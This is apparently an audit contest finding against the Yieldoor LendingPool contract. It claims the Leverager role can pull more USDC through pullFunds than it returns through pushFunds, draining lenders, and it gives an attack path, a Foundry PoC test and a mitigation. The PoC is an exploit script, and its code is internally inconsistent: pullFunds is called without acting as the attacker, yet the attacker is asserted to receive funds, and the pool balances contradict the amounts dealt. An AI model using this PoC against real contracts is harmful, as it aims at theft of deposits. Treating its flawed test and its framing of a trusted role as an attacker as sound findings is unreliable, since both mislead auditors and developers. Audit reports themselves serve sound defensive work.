# Leverager will steal funds from lenders by exploiting flash loan imbalance in pullFunds/pushFunds

### Summary

The lack of amount tracking in pullFunds/pushFunds will cause a direct fund loss for lenders as Leverager will pull more underlying tokens than it pushes back, draining yToken liquidity undetected.

### Root Cause

In LendingPool.sol:209-222 there is no mechanism to ensure the amount pushed back via pushFunds matches the amount pulled via pullFunds, allowing Leverager to retain excess tokens.
https://github.com/sherlock-audit/2025-02-yieldoor/blob/main/yieldoor/src/LendingPool.sol#L209-L222

### Internal Pre-conditions

Lender needs to call deposit to set yToken supply to be at least 100 USDC (depositing 100 USDC).
Leverager needs to be set to a controllable address via setLeverager (assumed deployed correctly per scope)

### External Pre-conditions

The exploit relies on internal LendingPool and Leverager interactions

### Attack Path

Lender calls deposit in LendingPool.sol, depositing 100 USDC and minting 100 yToken.
Leverager calls pullFunds(USDC, 100), receiving 100 USDC from yToken.
Leverager calls pushFunds(USDC, 50), returning only 50 USDC to yToken, retaining 50 USDC.
Lender attempts to redeem 100 yToken, expecting 100 USDC but receiving only 50 USDC (or transaction reverts due to insufficient liquidity).

### Impact

The lenders suffer an approximate loss of 50 USDC (50% of their deposit in this scenario). The Leverager gains 50 USDC directly from the stolen liquidity

### PoC

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../LendingPool.sol";
import "../yToken.sol";

contract FlashLoanImbalancePoC is Test {
    LendingPool lendingPool;
    yToken yTokenInstance;
    address usdc = address(0x1);
    address lender = address(0x2);
    address attacker = address(0x3);

    function setUp() public {
        lendingPool = new LendingPool();
        vm.startPrank(address(lendingPool));
        yTokenInstance = new yToken("yUSDC", "yUSDC", 6, usdc);
        vm.stopPrank();
        lendingPool.initReserve(usdc);
        vm.etch(usdc, abi.encodePacked(type(IERC20).runtimeCode));
        deal(usdc, lender, 1000e6); // USDC has 6 decimals
        deal(usdc, address(yTokenInstance), 1000e6);
        vm.startPrank(lender);
        IERC20(usdc).approve(address(lendingPool), type(uint256).max);
        vm.stopPrank();
        lendingPool.setLeverager(attacker);
    }

    function testFlashLoanImbalance() public {
        vm.prank(lender);
        lendingPool.deposit(usdc, 100e6, lender);
        assertEq(yTokenInstance.balanceOf(lender), 100e6);

        lendingPool.pullFunds(usdc, 100e6);
        assertEq(IERC20(usdc).balanceOf(attacker), 100e6);

        vm.startPrank(attacker);
        IERC20(usdc).approve(address(lendingPool), 50e6);
        lendingPool.pushFunds(usdc, 50e6);
        vm.stopPrank();
        assertEq(IERC20(usdc).balanceOf(address(yTokenInstance)), 50e6);

        vm.prank(lender);
        vm.expectRevert(); // Insufficient liquidity
        lendingPool.redeem(usdc, 100e6, lender);
        // Loss: 50 USDC stolen
    }
}

### Mitigation

Track pulled amounts per transaction in a mapping (mapping(address => mapping(address => uint256)) public pulledAmounts) in pullFunds, and require pushFunds to repay the exact amount pulled before transaction completion, resetting the tracked amount to zero.
